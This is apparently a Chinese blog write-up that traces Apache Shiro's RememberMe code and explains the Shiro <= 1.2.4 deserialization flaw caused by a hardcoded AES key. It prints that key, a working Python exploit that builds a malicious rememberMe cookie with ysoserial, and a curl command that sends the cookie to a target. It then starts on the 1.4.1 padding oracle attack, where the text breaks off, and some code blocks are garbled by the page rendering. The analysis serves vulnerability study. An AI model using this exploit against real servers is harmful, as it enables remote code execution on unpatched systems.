+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public final void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)</span><br><span class="line">        throws ServletException, IOException &#123;</span><br><span class="line">    String alreadyFilteredAttributeName = getAlreadyFilteredAttributeName();</span><br><span class="line">    if ( request.getAttribute(alreadyFilteredAttributeName) != null ) &#123;</span><br><span class="line">        log.trace(&quot;Filter &apos;&#123;&#125;&apos; already executed.  Proceeding without invoking this filter.&quot;, getName());</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125; else //noinspection deprecation</span><br><span class="line">        if (/* added in 1.2: */ !isEnabled(request, response) ||</span><br><span class="line">            /* retain backwards compatibility: */ shouldNotFilter(request) ) &#123;</span><br><span class="line">        log.debug(&quot;Filter &apos;&#123;&#125;&apos; is not enabled for the current request.  Proceeding without invoking this filter.&quot;,</span><br><span class="line">                getName());</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Do invoke this filter...</span><br><span class="line">        log.trace(&quot;Filter &apos;&#123;&#125;&apos; not yet executed.  Executing now.&quot;, getName());</span><br><span class="line">        request.setAttribute(alreadyFilteredAttributeName, Boolean.TRUE);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            doFilterInternal(request, response, filterChain);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            // Once the request has finished, we&apos;re done and we don&apos;t</span><br><span class="line">            // need to mark as &apos;already filtered&apos; any more.</span><br><span class="line">            request.removeAttribute(alreadyFilteredAttributeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在正常使用情况下，基本都是执行到doFilterInternal()方法，在跟进它的源码可以发现，它是一个抽象方法，因为OncePerRequestFilter是一个抽象类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">protected abstract void doFilterInternal(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">            throws ServletException, IOException;</span><br></pre></td></tr></table></figure></p>
+<p>既然这是个抽象类，那么大概这个方法的实现是在其子类里了，果不其然，在其子类AbstractShiroFilter中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">protected void doFilterInternal(ServletRequest servletRequest, ServletResponse servletResponse, final FilterChain chain)</span><br><span class="line">        throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    Throwable t = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        final ServletRequest request = prepareServletRequest(servletRequest, servletResponse, chain);</span><br><span class="line">        final ServletResponse response = prepareServletResponse(request, servletResponse, chain);</span><br><span class="line"></span><br><span class="line">        final Subject subject = createSubject(request, response);</span><br><span class="line"></span><br><span class="line">        //noinspection unchecked</span><br><span class="line">        subject.execute(new Callable() &#123;</span><br><span class="line">            public Object call() throws Exception &#123;</span><br><span class="line">                updateSessionLastAccessTime(request, response);</span><br><span class="line">                executeChain(request, response, chain);</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (ExecutionException ex) &#123;</span><br><span class="line">        t = ex.getCause();</span><br><span class="line">    &#125; catch (Throwable throwable) &#123;</span><br><span class="line">        t = throwable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (t != null) &#123;</span><br><span class="line">        if (t instanceof ServletException) &#123;</span><br><span class="line">            throw (ServletException) t;</span><br><span class="line">        &#125;</span><br><span class="line">        if (t instanceof IOException) &#123;</span><br><span class="line">            throw (IOException) t;</span><br><span class="line">        &#125;</span><br><span class="line">        //otherwise it&apos;s not one of the two exceptions expected by the filter method signature - wrap it in one:</span><br><span class="line">        String msg = &quot;Filtered request failed.&quot;;</span><br><span class="line">        throw new ServletException(msg, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法，我总结一下，主要做了两件总要的事情：</p>
+<ol>
+<li>创建Subject</li>
+<li>执行filter chains</li>
+</ol>
+<p>那么我们一一跟进去，看看它们到底是如何工作的。</p>
+<p>跟进createSubject()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected WebSubject createSubject(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">    return new WebSubject.Builder(getSecurityManager(), request, response).buildWebSubject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它通过了WebSubject的Builder，使用了创建者模式去创建这一个Subject的实现WebSubject</p>
+<p>继续跟进buildWebSubject()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public WebSubject buildWebSubject() &#123;</span><br><span class="line">    Subject subject = super.buildSubject();</span><br><span class="line">    if (!(subject instanceof WebSubject)) &#123;</span><br><span class="line">        String msg = &quot;Subject implementation returned from the SecurityManager was not a &quot; +</span><br><span class="line">                WebSubject.class.getName() + &quot; implementation.  Please ensure a Web-enabled SecurityManager &quot; +</span><br><span class="line">                &quot;has been configured and made available to this builder.&quot;;</span><br><span class="line">        throw new IllegalStateException(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return (WebSubject) subject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Subject-&gt;buildSubject<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Subject buildSubject() &#123;</span><br><span class="line">    return this.securityManager.createSubject(this.subjectContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最终可以发现，是通过我们配置的web安全管理器（WebSecurityManager）来创建Subject的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public Subject createSubject(SubjectContext subjectContext) &#123;</span><br><span class="line">    //create a copy so we don&apos;t modify the argument&apos;s backing map:</span><br><span class="line">    SubjectContext context = copy(subjectContext);</span><br><span class="line"></span><br><span class="line">    //ensure that the context has a SecurityManager instance, and if not, add one:</span><br><span class="line">    context = ensureSecurityManager(context);</span><br><span class="line"></span><br><span class="line">    //Resolve an associated Session (usually based on a referenced session ID), and place it in the context before</span><br><span class="line">    //sending to the SubjectFactory.  The SubjectFactory should not need to know how to acquire sessions as the</span><br><span class="line">    //process is often environment specific - better to shield the SF from these details:</span><br><span class="line">    context = resolveSession(context);</span><br><span class="line"></span><br><span class="line">    //Similarly, the SubjectFactory should not require any concept of RememberMe - translate that here first</span><br><span class="line">    //if possible before handing off to the SubjectFactory:</span><br><span class="line">    context = resolvePrincipals(context);</span><br><span class="line"></span><br><span class="line">    Subject subject = doCreateSubject(context);</span><br><span class="line"></span><br><span class="line">    //save this subject for future reference if necessary:</span><br><span class="line">    //(this is needed here in case rememberMe principals were resolved and they need to be stored in the</span><br><span class="line">    //session, so we don&apos;t constantly rehydrate the rememberMe PrincipalCollection on every operation).</span><br><span class="line">    //Added in 1.2:</span><br><span class="line">    save(subject);</span><br><span class="line"></span><br><span class="line">    return subject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>SubjectContext context = copy(subjectContext);</li>
+</ul>
+<p>对SubjectContext的一个简单复制，因为每次请求都应有它自己的一个上下文，不应该混合，所以每次请求，都会通过它去复制一个SubjectContext用于本次请求</p>
+<ul>
+<li>context = ensureSecurityManager(context);</li>
+</ul>
+<p>把安全管理器设置到SubjectContext中</p>
+<ul>
+<li>context = resolveSession(context);</li>
+</ul>
+<p>通过上下文中存储的session id，去会话管理器，回顾我们前面的配置，可以知道是一个ehcache的会话管理器，意味着，我们得回话都是存储在缓存中的，使用ehcache可以更方便的进行集群部署，以同步回话数据</p>
+<ul>
+<li>context = resolvePrincipals(context);</li>
+</ul>
+<p>这个是RememberMe的核心处，也是我们后面要详细讲的地方</p>
+<ul>
+<li>Subject subject = doCreateSubject(context);</li>
+</ul>
+<p>根据前面做的事情，在这一步创建Subject</p>
+<ul>
+<li>save(subject);</li>
+</ul>
+<p>把Subject保存到Session中</p>
+<p><strong>上面几点就是createSubject()方法逻辑的大概总结</strong></p>
+<p>接下来我们进一步去分析RememberMe模块的逻辑，跟进resolvePrincipals()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">protected SubjectContext resolvePrincipals(SubjectContext context) &#123;</span><br><span class="line"></span><br><span class="line">    PrincipalCollection principals = context.resolvePrincipals();</span><br><span class="line"></span><br><span class="line">    if (isEmpty(principals)) &#123;</span><br><span class="line">        log.trace(&quot;No identity (PrincipalCollection) found in the context.  Looking for a remembered identity.&quot;);</span><br><span class="line"></span><br><span class="line">        principals = getRememberedIdentity(context);</span><br><span class="line"></span><br><span class="line">        if (!isEmpty(principals)) &#123;</span><br><span class="line">            log.debug(&quot;Found remembered PrincipalCollection.  Adding to the context to be used &quot; +</span><br><span class="line">                    &quot;for subject construction by the SubjectFactory.&quot;);</span><br><span class="line"></span><br><span class="line">            context.setPrincipals(principals);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            log.trace(&quot;No remembered identity found.  Returning original context.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return context;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此处可以看到，是从上下文解析出凭证信息PrincipalCollection，如果获取不到，就会调用getRememberedIdentity()方法获取，最后设置到上下文中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">protected PrincipalCollection getRememberedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">    RememberMeManager rmm = getRememberMeManager();</span><br><span class="line">    if (rmm != null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            if (log.isWarnEnabled()) &#123;</span><br><span class="line">                String msg = &quot;Delegate RememberMeManager instance of type [&quot; + rmm.getClass().getName() +</span><br><span class="line">                        &quot;] threw an exception during getRememberedPrincipals().&quot;;</span><br><span class="line">                log.warn(msg, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public RememberMeManager getRememberMeManager() &#123;</span><br><span class="line">    return rememberMeManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回顾前面的安全管理器的bean配置，我们可以清楚的记得其实现class是org.apache.shiro.web.mgt.DefaultWebSecurityManager，也就是当前类DefaultSecurityManager的子类</p>
+<p>我们观察该子类的构造方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public DefaultWebSecurityManager() &#123;</span><br><span class="line">    super();</span><br><span class="line">    DefaultWebSessionStorageEvaluator webEvalutator = new DefaultWebSessionStorageEvaluator();  </span><br><span class="line">    ((DefaultSubjectDAO) this.subjectDAO).setSessionStorageEvaluator(webEvalutator);</span><br><span class="line">    this.sessionMode = HTTP_SESSION_MODE;</span><br><span class="line">    setSubjectFactory(new DefaultWebSubjectFactory());</span><br><span class="line">    setRememberMeManager(new CookieRememberMeManager());</span><br><span class="line">    setSessionManager(new ServletContainerSessionManager());</span><br><span class="line">    webEvalutator.setSessionManager(getSessionManager());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从构造方法可以很清楚的了解到，RememberMeManager的实现为CookieRememberMeManager</p>
+<p>那么，我们继续跟进到getRememberedPrincipals()方法中来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123;</span><br><span class="line">    PrincipalCollection principals = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        byte[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br><span class="line">        if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，主要就是两个点</p>
+<ol>
+<li>从cookie中读取rememberMe值，通过base64解码后再进行AES解密，得到其解密后的字节数据bytes</li>
+<li>把解密后的字节数据bytes反序列化为PrincipalCollection对象</li>
+</ol>
+<p>那么，聪明的人就会发现，如果我们可以控制解密后的明文，我们就可以实现反序列化RCE了</p>
+<h3 id="0x02-反序列化远古洞（Shiro-lt-1-2-4）"><a href="#0x02-反序列化远古洞（Shiro-lt-1-2-4）" class="headerlink" title="0x02 反序列化远古洞（Shiro &lt;= 1.2.4）"></a>0x02 反序列化远古洞（Shiro &lt;= 1.2.4）</h3><p>前面讲到了RememberMe这个点，接着，我们跟进1.2.4这个shiro版本的源码，去分析一下这个远古洞产生的原因吧。</p>
+<p>RememberMeManager的实现为CookieRememberMeManager，我们延续上一章，跟进其源码getRememberedPrincipals()方法实现，可以发现，CookieRememberMeManager并没有其实现方法，在向上跟踪时发现，它是继承了org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals，所以我们跟进到AbstractRememberMeManager的getRememberedPrincipals()方法实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123;</span><br><span class="line">    PrincipalCollection principals = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        byte[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br><span class="line">        if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而getRememberedSerializedIdentity()抽象方法由其子类CookieRememberMeManager实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">    //...</span><br><span class="line">    String base64 = getCookie().readValue(request, response);</span><br><span class="line">    // Browsers do not always remove cookies immediately (SHIRO-183)</span><br><span class="line">    // ignore cookies that are scheduled for removal</span><br><span class="line">    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;</span><br><span class="line"></span><br><span class="line">    if (base64 != null) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        if (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] decoded = Base64.decode(base64);</span><br><span class="line">        if (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return decoded;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //no cookie set - new site visitor?</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过调用SimpleCookie的readValue()方法读取了一个base64的cookie值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static final String DEFAULT_REMEMBER_ME_COOKIE_NAME = &quot;rememberMe&quot;;</span><br><span class="line"></span><br><span class="line">private Cookie cookie;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Constructs a new &#123;@code CookieRememberMeManager&#125; with a default &#123;@code rememberMe&#125; cookie template.</span><br><span class="line"> */</span><br><span class="line">public CookieRememberMeManager() &#123;</span><br><span class="line">    Cookie cookie = new SimpleCookie(DEFAULT_REMEMBER_ME_COOKIE_NAME);</span><br><span class="line">    cookie.setHttpOnly(true);</span><br><span class="line">    //One year should be long enough - most sites won&apos;t object to requiring a user to log in if they haven&apos;t visited</span><br><span class="line">    //in a year:</span><br><span class="line">    cookie.setMaxAge(Cookie.ONE_YEAR);</span><br><span class="line">    this.cookie = cookie;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过审阅CookieRememberMeManager源码可以发现，该cookie名为rememberMe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private String ensurePadding(String base64) &#123;</span><br><span class="line">    int length = base64.length();</span><br><span class="line">    if (length % 4 != 0) &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder(base64);</span><br><span class="line">        for (int i = 0; i &lt; length % 4; ++i) &#123;</span><br><span class="line">            sb.append(&apos;=&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        base64 = sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    return base64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接着通过调用ensurePadding()方法，如果rememberMe的base64值不符合规范，就会对其进行=符号的补充</p>
+<p>最后调用<figure class="highlight plain"><figcaption><span>decoded </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">回到方法getRememberedPrincipals()</span><br></pre></td></tr></table></figure></p>
+<p>public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {<br>    PrincipalCollection principals = null;<br>    try {<br>        byte[] bytes = getRememberedSerializedIdentity(subjectContext);<br>        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:<br>        if (bytes != null &amp;&amp; bytes.length &gt; 0) {<br>            principals = convertBytesToPrincipals(bytes, subjectContext);<br>        }<br>    } catch (RuntimeException re) {<br>        principals = onRememberedPrincipalFailure(re, subjectContext);<br>    }</p>
+<pre><code>return principals;
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接着是对base64解码后的数据执行convertBytesToPrincipals()方法，看名称，其实表达了很清晰的含义了，就是把字节数据转换为凭证</span><br></pre></td></tr></table></figure></p>
+<p>protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {<br>    if (getCipherService() != null) {<br>        bytes = decrypt(bytes);<br>    }<br>    return deserialize(bytes);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其中decrypt()方法就是对其进行ASE解密，然后由deserialize()方法对其解密数据进行反序列化</span><br></pre></td></tr></table></figure></p>
+<p>protected byte[] decrypt(byte[] encrypted) {<br>    byte[] serialized = encrypted;<br>    CipherService cipherService = getCipherService();<br>    if (cipherService != null) {<br>        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    }<br>    return serialized;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有一个很关键的地方，也是这个远古漏洞造成的原因，就是getDecryptionCipherKey()方法</span><br></pre></td></tr></table></figure></p>
+<p>public byte[] getDecryptionCipherKey() {<br>    return decryptionCipherKey;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它返回了一个AES解密的key，通过跟踪其设置的代码，可以跟到</span><br></pre></td></tr></table></figure></p>
+<p>public void setCipherKey(byte[] cipherKey) {<br>    //Since this method should only be used in symmetric ciphers<br>    //(where the enc and dec keys are the same), set it on both:<br>    setEncryptionCipherKey(cipherKey);<br>    setDecryptionCipherKey(cipherKey);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”);</p>
+<p>public AbstractRememberMeManager() {<br>    this.serializer = new DefaultSerializer<principalcollection>();<br>    this.cipherService = new AesCipherService();<br>    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">没错，这个AES解密的key在默认情况下，是一个预置的值，那么到这里，这个漏洞的成因以及完全剖析结束了，那么，我们试试效果？</span><br><span class="line"></span><br><span class="line">这是我测试的exploits：</span><br></pre></td></tr></table></figure></principalcollection></p>
+<p>import sys<br>import base64<br>import uuid<br>from random import Random<br>import subprocess<br>from Crypto.Cipher import AES</p>
+<p>def encode_rememberme(payload,command):<br>    popen = subprocess.Popen([‘java’, ‘-jar’, ‘../ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar’, payload, command], stdout=subprocess.PIPE)<br>    BS   = AES.block_size<br>    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br>    key = “kPH+bIxk5D2deZiIxcaaaA==”<br>    mode =  AES.MODE_CBC</p>
+<pre><code>#iv   =  base64.b64decode(rememberMe)[:16]   
+iv = uuid.uuid4().bytes
+print(iv)
+encryptor = AES.new(base64.b64decode(key), mode, iv)
+file_body = pad(popen.stdout.read())
+base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+return base64_ciphertext
+</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    print(sys.argv[1],sys.argv[2])<br>    payload = encode_rememberme(sys.argv[1],sys.argv[2])<br>    with open(“payload.cookie”, “w”) as fpw:<br>        print(“rememberMe={}”.format(payload.decode()), file=fpw)<br>~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过这个exp，就能生成攻击的cookie，最后使用这个cookie，就能达到RCE</span><br></pre></td></tr></table></figure></p>
+<p>curl -d “” “<a href="http://A.B.C.D:8080/login&quot;" target="_blank" rel="noopener">http://A.B.C.D:8080/login&quot;</a> –cookie “<code>cat payload.cookie</code>“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">漏洞的修复：</span><br><span class="line"></span><br><span class="line">在爆出这样的一个漏洞后，shiro官方的修复手段也很简单，就是让shiro每次启动，都会随机生成一个新的key作为AES解密的key，从而修复这个远古洞。</span><br></pre></td></tr></table></figure></p>
+<p>public AbstractRememberMeManager() {<br>    this.serializer = new DefaultSerializer<principalcollection>();<br>    AesCipherService cipherService = new AesCipherService();<br>    this.cipherService = cipherService;<br>    setCipherKey(cipherService.generateNewKey().getEncoded());<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 0x03 PaddingOracle CBC Attack（shiro &lt;= 1.4.1）</span><br><span class="line"></span><br><span class="line">在好几年前的远古洞被修复之后，为何在前段时间，又爆出了新的RCE洞，而且还是在AES这个地方。</span><br><span class="line"></span><br><span class="line">基本上，玩过CTF的人，大部分都了解过padding oracle和cbc翻转攻击，如果不太了解的，我建议看看[《我对Padding Oracle攻击的分析和思考（详细）》](https://www.freebuf.com/articles/web/15504.html)这个文章。</span><br><span class="line"></span><br><span class="line">要进行padding oracle攻击，需要目标系统满足一个条件，就是对于ASE解密时padding的正确与否，目标会返回一个明确的信息，类似布尔盲注。</span><br><span class="line"></span><br><span class="line">我们转到被爆出漏洞的shiro版本（1.4.1）源码</span><br><span class="line"></span><br><span 